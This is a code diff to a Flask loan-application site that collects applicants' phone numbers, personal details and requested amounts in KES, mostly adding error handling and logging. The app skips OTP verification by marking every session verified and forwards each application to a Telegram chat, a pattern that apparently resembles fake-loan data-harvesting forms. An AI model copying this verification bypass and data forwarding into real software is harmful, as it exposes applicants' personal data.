@@ -33,7 +33,7 @@ LOAN_PRODUCTS = {
 # ==================== END CONFIG ====================
 
 def send_telegram_message(message):
-    """Send message to Telegram"""
+    """Send message to Telegram with error handling"""
     if not TELEGRAM_ENABLED:
         logger.warning("Telegram not configured - message not sent")
         return None
@@ -46,7 +46,15 @@ def send_telegram_message(message):
             'parse_mode': 'HTML'
         }
         response = requests.post(url, json=payload, timeout=10)
-        return response.json()
+        if response.status_code == 200:
+            logger.info("Telegram message sent successfully")
+            return response.json()
+        else:
+            logger.error(f"Telegram error: {response.status_code} - {response.text}")
+            return None
+    except requests.exceptions.Timeout:
+        logger.error("Telegram request timed out")
+        return None
     except Exception as e:
         logger.error(f"Telegram error: {e}")
         return None
@@ -142,7 +150,7 @@ def apply():
             session['phone'] = phone
             logger.info(f"Phone saved to session: {session['phone']}")
             # Skip OTP and go directly to personal info
-            session['verified'] = True  # Auto-verify
+            session['verified'] = True
             return redirect(url_for('personal_info'))
         else:
             error = "Please enter a valid phone number (at least 7 digits)"
@@ -210,9 +218,9 @@ def loan_amount():
                 'application_id': application_id
             }
             
-            # Send to Telegram
-            if TELEGRAM_ENABLED:
-                try:
+            # Send to Telegram (with error handling - won't break the app)
+            try:
+                if TELEGRAM_ENABLED:
                     message = format_application_message(application_data)
                     send_telegram_message(message)
                     send_telegram_message(
@@ -220,27 +228,41 @@ def loan_amount():
                         f"{application_data['last_name']} for KES {amount:,.2f}"
                     )
                     logger.info(f"Application {application_id} sent to Telegram")
-                except Exception as e:
-                    logger.error(f"Failed to send to Telegram: {e}")
+                else:
+                    logger.warning("Telegram not configured - skipping notification")
+            except Exception as e:
+                logger.error(f"Telegram notification failed but application continues: {e}")
             
+            # Store in session
             session['application_data'] = application_data
             return redirect(url_for('confirmation'))
             
-        except ValueError:
+        except ValueError as e:
+            logger.error(f"ValueError: {e}")
             error = "Please enter a valid amount"
+            return render_template('loan_amount.html', error=error)
+        except Exception as e:
+            logger.error(f"Unexpected error: {e}")
+            error = "An unexpected error occurred. Please try again."
             return render_template('loan_amount.html', error=error)
     
     return render_template('loan_amount.html', min_loan=MIN_LOAN, max_loan=MAX_LOAN)
 
 @app.route('/confirmation')
 def confirmation():
-    """Step 4: Application confirmation"""
+    """Step 4: Application confirmation - Success Message"""
     if 'phone' not in session:
         return redirect(url_for('apply'))
     
     data = session.get('application_data', {})
+    
+    # If no data, redirect to loan amount
     if not data:
         return redirect(url_for('loan_amount'))
+    
+    # Clear session data after showing confirmation
+    # (optional - comment out if you want to keep data)
+    # session.clear()
     
     return render_template('confirmation.html',
                          first_name=data.get('first_name', ''),
@@ -289,6 +311,16 @@ def privacy():
 @app.route('/terms')
 def terms():
     return render_template('terms.html')
+
+# Error handlers
+@app.errorhandler(404)
+def page_not_found(e):
+    return render_template('index.html'), 404
+
+@app.errorhandler(500)
+def internal_server_error(e):
+    logger.error(f"500 Error: {e}")
+    return render_template('index.html', error="Something went wrong. Please try again."), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
